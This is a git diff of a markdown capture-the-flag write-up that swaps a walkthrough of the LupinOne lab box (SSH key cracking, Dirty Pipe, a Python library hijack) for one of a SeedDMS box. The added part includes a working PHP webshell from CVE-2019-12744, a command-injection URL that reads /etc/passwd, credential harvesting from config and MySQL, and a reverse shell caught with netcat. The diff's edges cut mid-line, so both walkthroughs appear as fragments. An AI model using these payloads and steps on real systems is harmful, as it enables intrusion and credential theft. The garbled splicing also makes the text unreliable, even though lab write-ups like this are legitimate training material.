@@ -372,194 +372,344 @@ Let's hope Matrix: Resurrections rocks!
 
 scann web directory --> analysis php file --> LFI --> upload webshell --> get revers shell --> privilege escalation
 
-### 2. unpasswd the ssh private key 
+s <5.1.11] (REQUIRED)
+# Tested on: [NA]
+# CVE : [CVE-2019-12744]
 
-Well, the key file has passphase, we need to unlock it.
+Exploit Steps:
 
-It's like has been encoded, check it:
+Step 1: Login to the application and under any folder add a document.
+Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
 
-![image-20231113165107375](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131651529.png)
+PHP Backdoor Code:
+<?php
 
-It is encoded by base58, so decode it:
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
 
-![image-20231113165201242](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131652389.png)
+?>
 
-We got the private key file. And then broute force it with john:
+Step 3: Now after uploading the file check the document id corresponding to the document.
+Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.
 
-```shell
-┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
-└─$ python ssh2join.py hash>hash1
-
-┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
-└─$ cat hash1
-hash:$sshng$2$16$f2df77361693c16003677b8a33deeb06$2486$6f70656e7373682d6b65792d7631000000000a6165733235362d636263000000066263727970740000001800000010f2df77361693c16003677b8a33deeb06000000100000000100000217000000077373682d727361000000030100010000020100c1cc78f325cbe4f465e2cada65813f73fe63fdd4da8e53d428030a29e493718447e6fe3e4a426763fc907bb10d61068b4e36fa9a01d9ac2be3982fd1fa3526f48cc6cc738b2816b0629e82c4931f3de01fcfa944ce0deb0c115fda2b6d9429e81dc2527d02b7fed58e3c57cea09334bac73a0a9ff131564029b1d8a6211bc686cbf864c98c6449132284c41b3eeb683ed01c31178aeb16974864877deb4190ab16c6454fb274c0a80bad7da99a83100baa38d8e40968d2c1cd3c4263a8d4d810d0102a15b913cbede25ad3f9d17c268eac8ccf7d9fcd35882efc395fd4299b5c4b02566943ef571b3eac1f58a19fde159e12bd16750844b937f93b20c80b051b83474b88acf891cb2461c0f31f4667683b268e862fdae2d52e2d7d8eb7e7a7fb55a0b6ca9b7f489a657a26e6e3e899a91d77b07b02a2bfacf59cd13c9a41cca58e4885ed1c2ddcafdf5e9b148f0efb7cb99b780f22151493bf02e67d1550e3d240cb31e7a77e07d1f66c5888da5a35f264c56b06b4a5f5dd701557664a2e5f79e5641d7f5e88a9ef52c7de43c8ed4edf3eccf91321483d621a10db119b39dbb58f5a8d085b8c70231429408735c98b82c667a9a368612297ef60e14ee98ed100a98bf5fb7c7c17ecee899b1574caffeba31ae1eea2c0f2ea9adceddd488519be087b5c5a5907fb527968294ca32ef33005b6f781161a9016d0029a0e3611a8610000075064b8515cb4008dae50f1375f34bdccea9975ecfa87dd1520e27a23612822dd4aa143b1200b69790b5fc0c50e9158db7eaa404d69a02f8b26c3c72584a964eaf47068ed5a932431c067cc3f6eca70a3859f628da3d8fef318ee6b4764d098f127a8580c585d3a0acb672effea55c8643be8a62ddc9d004fbc00d8e47768c324d28d4ba28ceecaf3ab07771730787be7305f810c8079e0fb2f2606fdbef3eb31af57165c6bf839ef6097c5749795b40ec3f011f00ae100fe1225136416857661109edfc5a1404a7847a93edf8b4afa452811a5406f053e21c858c8cf196ab4af1d5a44bc550f8803521c267f6fea5d290b41cd3939fd51ff264dd03dc1faf44272c7cfe0444fe095063acfa9c2eaea06e0090897e80ec59d2158926fd11d5282b73dd66055718c26b943c5441e5814c1c359b62667422f719b54c51b12936fee583599716e2d0ec90454f7edaea137e9fb66f5e27f9d60ec66837165b8e8e1c178e0f4c5d1653a53452c256ea60dc943928e974a308ae2d93cbebe2a401f0e2c140c6db08e11538e3a6f6bbbcf5ed5af8508a8443cfe8b7f0a0118264c92a74ea9499ab2dbc27949a1b7a6b5cfa9d74e2ce89a6672c7e96d83d73dc5f78ef2d835c5ab027a5d4196e22150ac060e42c278812c0f51d80c15dbf878e61dfc33462a67fed2ee34f2cd8c69f1f4ba5577b33bd858e4ea5972f0a5062fbcfde4702dc264a0a8846537e33988a941e4255a7ead33e7d541f2f6fda0c5069020b955045f2a5cef2a73e4d007bd4323d4cc00f2fa00ae4361e64a4253c4ce8ac68654a4309fbe7d3c4f1b74767ec29d3ac53c621c4ce70d8b6c731aedf00bb8e966f92771937ea91074b9c77abdf274e26713d37539a2afbebb25f1f2de8428449ae0b5dc70f18d8697e19c4720be2e9004c0604353e1d094a7501ee38eb923a82d6af2a44db847161f21e0b5cef9270128e5178b755fe164158f0fc65e7e6f14cad14349a804078d048fd8db0f91a81cc3c1c7c54938b850fb8ff1b9a6a2ac2eecf4e717e160d9797dc4d058cff64ab7404607cdc8b1cd70a99392a7566c4fba5eef362790da0a818ed47d040dcfa825cf7881f43965d813e2d19c6df95ba99eaaa401c3c8123f09f8f589585b7c31bf51b7ab1a9a6a81b6dc74f777129cb2ca7e5ea99200b689233625a671f90a66a8e1e050e23bfbab129186ca6501b6cbdbbe34797b6b864dc021689ac358740d15eb9b61a4bdbbc011ec31dec5c4b4f9cc1b8615c950057e0237ecc503adc2cef77a156f8a7fac71eaa8f34c3703359ecf9a745ed1123cc5c2be3fb6b66ad17164ae909ee5f0581f9f18c9f3bf83cba9dc3331712488eb746a49b93ad19de2622c01f22420a2bb599b452c41bccb8fd8b5ca2290e8e7a44506841b1ba22140354af66840ef4d9d3a34495cbb987cf31b5ee72b894c257a93c65d3cab6e8ecef76a7af317f5bdc600155a1fb7ec631a1717b783b114b1f37a63adc49dfadd3eb7f618850febdb3df461fab02dab3b96da09a2d4dc98fa88236f09a57fe796990431cb97a0b0f32ef099391a3b01877c250aed836032b3ca471b29f29453034e7d7780f25360984b0cee07f7eedd672f36e6691f2a76213e78a8294160a892b6cacc106913cb6a41d4caf88d5eab71caa29ce6a610326945d4cf9f4a31311187d76c8701859ee05d8c1a9465fbb97f2f93cccee5d87d5bd49b3b82f1948f274af7b31892560465d90194a22e4095a74f0f78ac6628dd92d53cf1aa85bb54e9c8de306f283dc8a505d2b1b4e0cf9581d3b0549946f1097975358cd71cf1003fde4893c70c07c30ec857049530fc057251057d88eb31ce87ee106b8fa8564f5996e2c1c5ebb6dab5601bb9794c77233bb2f862e6e25ee1363fbbbbee86d651f7a5b42f304348c0ad68b6eb1fc852dfc53fc36af7ae290fb9bf74f1d013cfe8878575353196ac3b0adc06cb93f32b81139283b21ce014bff08c1156e0be776c353eaf97fb33246e51290f8f48bae21acc9047937b3a4b25948497c3eaee02dcdf330b725e6e5ea2c5e54cdaf109599d9585ccbedf5a8ff343bff8a93d35459a96ccfee8ab76cae7815cdd4b2c524d45532f54ef36debcd554e636c97c3c01564a3aa0d1ce0bc19350079d2eebde57c758487947236188420a67ec034ae38a7a7a9cef519fbe0995394ca9613b68239dbb7e217ff6b4b73101f667797ea96330e40d4f53604290cb28d3ad0e204f4fe4a7c5ddab716e20158a2ea829f067461a8cdace12a560d977cc4f69f92d04f32037ded3ccb58cea98b43604be7c9b493e90d12fcbd31af1421c7562e1281307ae3e1d3007e77b900b9aa2ce3e6ddfc8a7dcb096b4f131195dde88a6f1b8cc6d0c6c3048b4ff0ca71941be74b10b095312a4b8cc9fbc3402f70ca16271f4ff89bd6a181a4f0cd015fc9fec36d3334fac5caae54d874c6063598ad29ea81d5bb14d87a43821dc7bae74855bb571bbe2765a2cf4debd2ad929200e8adf90cfa336640b89279b3b50496aacb96247614037e8011029b646acc1dc7ba3f26337f518ad446b4885e8e9b16ac391b4b35473214c4cf8b48c0780a934d414c3df8af279e97fe0e465b0289427ae9699150df44a15964782cd02708af2$16$614
-
-┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
-└─$ john hash1 --wordlist=/usr/share/wordlists/fasttrack.txt
-Using default input encoding: UTF-8
-Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
-Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
-Cost 2 (iteration count) is 16 for all loaded hashes
-Press 'q' or Ctrl-C to abort, almost any other key for status
-P@55w0rd!        (hash)
-1g 0:00:00:04 DONE (2023-11-13 03:57) 0.2283g/s 9.817p/s 9.817c/s 9.817C/s P@55w0rd!
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed.
+Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
 ```
 
-Now, we can login ssh with user icex64 and private key:
+If we want to use the exploit, we need to login the website. But we have no passwd now.
+
+### 1. Scan the web path
+
+We has found a url path named `/seeddms51x/seeddms-5.1.22/`, so we can scan it now:
 
 ```shell
-┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
-└─$ ssh icex64@172.16.86.148 -i hash
-Enter passphrase for key 'hash':
-Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
-########################################
-Welcome to Empire: Lupin One
-########################################
-Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4
-icex64@LupinOne:~$ id
-uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)
+┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+└─$ gobuster dir -u http://172.16.86.150/seeddms51x/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 60
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.16.86.150/seeddms51x/
+[+] Method:                  GET
+[+] Threads:                 60
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/data                 (Status: 301) [Size: 324] [--> http://172.16.86.150/seeddms51x/data/]
+/www                  (Status: 301) [Size: 323] [--> http://172.16.86.150/seeddms51x/www/]
+/conf                 (Status: 301) [Size: 324] [--> http://172.16.86.150/seeddms51x/conf/]
+/pear                 (Status: 301) [Size: 324] [--> http://172.16.86.150/seeddms51x/pear/]
+Progress: 220560 / 220561 (100.00%)
+===============================================================
+Finished
+===============================================================
 ```
+
+Well, we found a `conf`, keep scanning:
+
+```shell
+┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+└─$ gobuster dir -u http://172.16.86.150/seeddms51x/conf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x .txt,.conf,.xml,.php-t 60
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.16.86.150/seeddms51x/conf
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,conf,xml,php-t
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/settings.xml         (Status: 200) [Size: 12377]
+Progress: 1102800 / 1102805 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+Well, we can find mysql username and password in `settings.xml` file:
+
+![image-20231114192921392](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141929656.png)
+
+### 2. Login to mysql
+
+We use the username and password login to mysql, and look for something useful:
+
+```shell
+┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+└─$ mysql -u seeddms -h 172.16.86.150 -p
+Enter password:
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 8
+Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+MySQL [seeddms]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| seeddms            |
+| sys                |
++--------------------+
+5 rows in set (0.002 sec)
+
+MySQL [(none)]> use seeddms;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [seeddms]> show tables;
++------------------------------+
+| Tables_in_seeddms            |
++------------------------------+
+| tblACLs                      |
+| tblAttributeDefinitions      |
+| tblCategory                  |
+| tblDocumentApproveLog        |
+| tblDocumentApprovers         |
+| tblDocumentAttributes        |
+| tblDocumentCategory          |
+| tblDocumentContent           |
+| tblDocumentContentAttributes |
+| tblDocumentFiles             |
+| tblDocumentLinks             |
+| tblDocumentLocks             |
+| tblDocumentReviewLog         |
+| tblDocumentReviewers         |
+| tblDocumentStatus            |
+| tblDocumentStatusLog         |
+| tblDocuments                 |
+| tblEvents                    |
+| tblFolderAttributes          |
+| tblFolders                   |
+| tblGroupMembers              |
+| tblGroups                    |
+| tblKeywordCategories         |
+| tblKeywords                  |
+| tblMandatoryApprovers        |
+| tblMandatoryReviewers        |
+| tblNotify                    |
+| tblSessions                  |
+| tblUserImages                |
+| tblUserPasswordHistory       |
+| tblUserPasswordRequest       |
+| tblUsers                     |
+| tblVersion                   |
+| tblWorkflowActions           |
+| tblWorkflowDocumentContent   |
+| tblWorkflowLog               |
+| tblWorkflowMandatoryWorkflow |
+| tblWorkflowStates            |
+| tblWorkflowTransitionGroups  |
+| tblWorkflowTransitionUsers   |
+| tblWorkflowTransitions       |
+| tblWorkflows                 |
+| users                        |
++------------------------------+
+43 rows in set (0.003 sec)
+```
+
+We can find users in table `users`:
+
+```shell
+MySQL [seeddms]> select * from users;
++-------------+---------------------+--------------------+-----------------+
+| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
++-------------+---------------------+--------------------+-----------------+
+|           1 | saket               | saurav             | Saket@#$1337    |
++-------------+---------------------+--------------------+-----------------+
+1 row in set (0.003 sec)
+```
+
+the password is plaintext.
+
+We can found users in table `tblUsers`:
+
+![image-20231114193335821](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141933087.png)
+
+And we can find a `admin` user and password, try to decrypt the passwd with MD5:
+
+![image-20231114193523530](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141935802.png)
+
+Failed. Well, we can try to update the passwd of admin:
+
+![image-20231114193704173](/Users/v4ler1an/Library/Application Support/typora-user-images/image-20231114193704173.png)
+
+Ok, let us login the website:
+
+![image-20231114193829247](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141938519.png)
+
+And then, we can use exploit now.
+
+### 3. Exploit the website
+
+We upload a php reverse shell to website:
+
+![image-20231114194413643](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141944910.png)
+
+We need to attention at the file ID:
+
+![image-20231114194542518](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141945800.png)
+
+Because when we access the shell file, we need to know the id of it:
+
+![image-20231114194932337](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141949608.png)
+
+After we upload the file twice, the ID changed to 5.
+
+And then, we can access the shell through uri `/data/1048576/5/shell.php`, and listen on kali:
+
+```shell
+┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+└─$ nc -lvp 1234
+listening on [any] 1234 ...
+172.16.86.150: inverse host lookup failed: Unknown host
+connect to [172.16.86.138] from (UNKNOWN) [172.16.86.150] 55002
+Linux ubuntu 5.8.0-59-generic #66~20.04.1-Ubuntu SMP Thu Jun 17 11:14:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 03:56:09 up 43 min,  0 users,  load average: 0.74, 0.22, 0.13
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+
 
 ## 4. Privilege Escalation
 
-Now, we need to get root privilege.
-
-### 1. First method - Dirty_PIPE
-
-We found that the target has gcc, and kenel version is 5.10.0, so we can use dirty_pipe vulnerability to get root:
+First, turn on the interactive shell with python:
 
 ```shell
-icex64@LupinOne:~$ (uname -a || cat /proc/version) 2>/dev/null
-Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU/Linux
-icex64@LupinOne:~$ gcc --version
-gcc (Debian 10.2.1-6) 10.2.1 20210110
-Copyright (C) 2020 Free Software Foundation, Inc.
-This is free software; see the source for copying conditions.  There is NO
-warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-icex64@LupinOne:~$ ./checker.sh
-5 10 0
-Vulnerable
-icex64@LupinOne:~$ cat checker.sh
-#!/bin/bash
-# usage
-# Check current kernel ./dpipe.sh
-# Check specific kernel ./dpipe.sh 5.10.102
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
-kernel=$1
-ver1=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f1)
-ver2=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f2)
-ver3=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f3)
-echo $ver1 $ver2 $ver3
+Look up users:
 
-if (( ${ver1:-0} < 5 )) ||
-   (( ${ver1:-0} > 5 )) ||
-   (( ${ver1:-0} == 5 && ${ver2:-0} < 8 )) ||
-   (( ${ver1:-0} == 5 && ${ver2:-0} == 10 && ${ver3:-0} == 102 )) ||
-   (( ${ver1:-0} == 5 && ${ver2:-0} == 10 && ${ver3:-0} == 92 )) ||
-   (( ${ver1:-0} == 5 && ${ver2:-0} == 15 && ${ver3:-0} == 25 )) ||
-   (( ${ver1:-0} == 5 && ${ver2:-0} >= 16 && ${ver3:-0} >= 11 )) ||
-   (( ${ver1:-0} == 5 && ${ver2:-0} > 16 ));
-then
-    echo Not vulnerable
-    exit 0
-else
-    echo Vulnerable
-    exit 1
-fi
-icex64@LupinOne:~$ ./a.out
-Backing up /etc/passwd to /tmp/passwd.bak ...
-Setting root password to "aaron"...
-system() function call seems to have failed :(
-icex64@LupinOne:~$ su
-Password:
-# id
+```shell
+www-data@ubuntu:/$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
+nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
+whoopsie:x:120:125::/nonexistent:/bin/false
+colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
+saket:x:1000:1000:Ubuntu_CTF,,,:/home/saket:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+Well, we found the user `saket` which we has seen it in `users` table. Try to switch to it with password `Saket@#$1337` and su to root:
+
+```shell
+saket@ubuntu:/$ id
+id
+uid=1000(saket) gid=1000(saket) groups=1000(saket),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
+saket@ubuntu:/$ sudo -l
+sudo -l
+[sudo] password for saket: Saket@#$1337
+
+Matching Defaults entries for saket on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User saket may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+saket@ubuntu:/$ sudo su
+sudo su
+root@ubuntu:/# id
+id
 uid=0(root) gid=0(root) groups=0(root)
-# ls
-a.out  checker.sh  dirty_pipe.c  user.txt
-# ls /root
-root.txt
-# cat /root/root.txt
-*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
-,                       .&&&&&&&&&(            /&&&&&&&&&
-,                    &&&&&&*                          @&&&&&&
-,                *&&&&&                                   &&&&&&
-,              &&&&&                                         &&&&&.
-,            &&&&                   ./#%@@&#,                   &&&&*
-,          &%&&          &&&&&&&&&&&**,**/&&(&&&&&&&&             &&&&
-,        &@(&        &&&&&&&&&&&&&&&.....,&&*&&&&&&&&&&             &&&&
-,      .& &          &&&&&&&&&&&&&&&      &&.&&&&&&&&&&               &%&
-,     @& &           &&&&&&&&&&&&&&&      && &&&&&&&&&&                @&&&
-,    &%((            &&&&&&&&&&&&&&&      && &&&&&&&&&&                 #&&&
-,   &#/*             &&&&&&&&&&&&&&&      && #&&&&&&&&&(                 (&&&
-,  %@ &              &&&&&&&&&&&&&&&      && ,&&&&&&&&&&                  /*&/
-,  & &               &&&&&&&&&&&&&&&      &&* &&&&&&&&&&                   & &
-, & &                &&&&&&&&&&&&&&&,     &&& &&&&&&&&&&(                   &,@
-,.& #                #&&&&&&&&&&&&&&(     &&&.&&&&&&&&&&&                   & &
-*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&             &(&
-*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&            & &
-*& *              &&&&&&&&&&&&&&&&&&&@.                 &&&&&&&&             @ &
-*&              &&&&&&&&&&&&&&&&&&@    &&&&&/          &&&&&&                & &
-*% .           &&&&&&&&&&&@&&&&&&&   &  &&(  #&&&&   &&&&.                   % &
-*& *            &&&&&&&&&&   /*      @%&%&&&&&&&&    &&&&,                   @ &
-*& &               &&&&&&&           & &&&&&&&&&&     @&&&                   & &
-*& &                    &&&&&        /   /&&&&         &&&                   & @
-*/(,                      &&                            &                   / &.
-* & &                     &&&       #             &&&&&&      @             & &.
-* .% &                    &&&%&     &    @&&&&&&&&&.   %@&&*               ( @,
-/  & %                   .&&&&  &@ @                 &/                    @ &
-*   & @                  &&&&&&    &&.               ,                    & &
-*    & &               &&&&&&&&&& &    &&&(          &                   & &
-,     & %           &&&&&&&&&&&&&&&(       .&&&&&&&  &                  & &
-,      & .. &&&&&&&&&&&&&&&&&&&&&&&&&&&&*          &  &                & &
-,       #& & &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&        &.             %  &
-,         &  , &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.     &&&&          @ &*
-,           & ,, &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.  /&&&&&&&&    & &@
-,             &  & #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&@ &. &&
-,               && /# /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&# &&&# &# #&
-,                  &&  &( .&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&  &&
-/                     ,&&(  &&%   *&&&&&&&&&&%   .&&&  /&&,
-,                           &&&&&/...         .#&&&&#
-
-3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
-See you on the next heist.
+root@ubuntu:/# ls /root
+ls /root
+app.apk  Documents  Music     Public  Templates
+Desktop  Downloads  Pictures  snap    Videos
 ```
 
-Thsi way is easy, but maybe cause the kernel crash, or root can not login.
+## Notes
 
-### 2. Second method - LinPEAS
 
-Download and execute LinPEAS.sh:
-
-![image-20231113174315301](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131743561.png)
-
-And we can see some exploit suggester:
-
-![image-20231113174414155](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131744400.png)
-
-![image-20231113174437529](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131744767.png)
-
-And we can see user icex64's privilege info:
-
-![image-20231113174549032](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131745283.png)
-
-And we found some writable files:
-
-![image-20231113174704337](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131747592.png)
-
-As we know, the file `/home/arsene/heist.py` content like follow:
-
-```shell
-icex64@LupinOne:~$ cat /home/arsene/heist.py
-import webbrowser
-
-print ("Its not yet ready to get in action")
-
-webbrowser.open("https://empirecybersecurity.co.mz")
-```
-
-and the file webbrowser.py is writable. So, we can change the `/usr/lib/python3.9/webbrowser.py` file to achive the root.
+ge the `/usr/lib/python3.9/webbrowser.py` file to achive the root.
 
 Modify the file `/usr/lib/python3.9/webbrowser.py` as follows, add some payload:
 
